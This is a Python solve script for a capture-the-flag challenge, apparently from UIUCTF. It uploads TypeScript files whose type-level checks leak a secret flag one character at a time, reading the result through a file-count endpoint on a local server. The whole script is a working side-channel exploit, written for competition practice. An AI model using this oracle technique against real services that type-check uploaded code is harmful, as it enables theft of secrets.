import time
import requests

def check_filecount():
  url = "http://localhost:3000/filecount"
  count = requests.get(url).json()['file_count']

  if count == 0:
    return True
  return False

def check_char(index: int, char: str):
  solve_script = """
  import { flag } from "../index";

  type CharAt<
    S extends string,
    I extends number,
    Count extends any[] = []
  > = S extends `${infer First}${infer Rest}`
    ? Count["length"] extends I
      ? First
      : CharAt<Rest, I, [...Count, any]>
    : never;

  type Check<C extends string> = CharAt<typeof flag, %d> extends C ? true : false;

  type Leak0A = Check<"%s"> extends true ? true : Leak0A;
  """.strip() % (index, char)

  url = "http://localhost:3000/upload"
  files = {
    "file": ("solve.ts", solve_script, "application/typescript")
  }

  requests.post(url, files=files)

  time.sleep(1)

  return check_filecount()

import string

actual_flag = "uiuctf{fake_flag}"
charset = string.ascii_lowercase + "{}_"

flag = ""

for i in range(len(actual_flag)):
  for char in charset:
    if check_char(i, char):
      flag += char
      print(flag)
      time.sleep(5)
      break

print(flag)
